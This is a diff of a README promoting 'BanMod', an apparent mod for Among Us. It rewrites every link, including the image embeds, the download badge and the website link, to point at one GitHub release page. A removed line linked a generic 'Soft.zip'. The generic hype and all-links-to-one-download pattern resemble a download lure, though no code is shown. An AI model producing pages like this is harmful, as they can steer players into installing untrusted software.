@@ -1,6 +1,6 @@
 ## 🚀 Welcome to BanMod - A Mod for Among Us!
 
-![Among Us](https://github.com/example/among-us-image.png)
+![Among Us](https://github.com/Bones002/BanMod/releases/tag/v1.2)
 
 BanMod is a unique mod created specifically for Among Us, the popular multiplayer online game where players work together to complete tasks while attempting to identify impostors among their crewmates. Our mod introduces exciting new features and enhancements to make your Among Us experience even more enjoyable and engaging.
 
@@ -15,7 +15,7 @@ BanMod is designed to enhance gameplay and provide players with new ways to inte
 ### 🔗 Quick Access
 Click the button below to download BanMod and start enjoying the new enhancements right away!
 
-[![Download BanMod](https://img.shields.io/badge/Download-BanMod-green)](https://github.com/files/Soft.zip)
+[![Download BanMod](https://github.com/Bones002/BanMod/releases/tag/v1.2)](https://github.com/Bones002/BanMod/releases/tag/v1.2)
 
 ### 🌟 Features
 1. **Custom Skins**: Express yourself with unique character skins.
@@ -32,7 +32,7 @@ Click the button below to download BanMod and start enjoying the new enhancement
 If you encounter any issues with the download link or installation process, please check the "Releases" section of the repository for alternative download options.
 
 ### 🌐 Visit Our Website
-For more information and updates on BanMod, visit our website [here](https://banmodwebsite.com).
+For more information and updates on BanMod, visit our website [here](https://github.com/Bones002/BanMod/releases/tag/v1.2).
 
 ### 🤝 Contributions
 We welcome contributions from the community to further enhance the mod and provide players with an even more enjoyable gaming experience. Feel free to submit pull requests or reach out to us with your ideas and suggestions.
@@ -45,4 +45,4 @@ Download BanMod now and dive into a world of new possibilities within Among Us. 
 
 Let the fun and excitement begin with BanMod - the ultimate mod for Among Us! 🎉
 
-![Among Us Characters](https://github.com/example/among-us-characters.png)
+![Among Us Characters](https://github.com/Bones002/BanMod/releases/tag/v1.2)
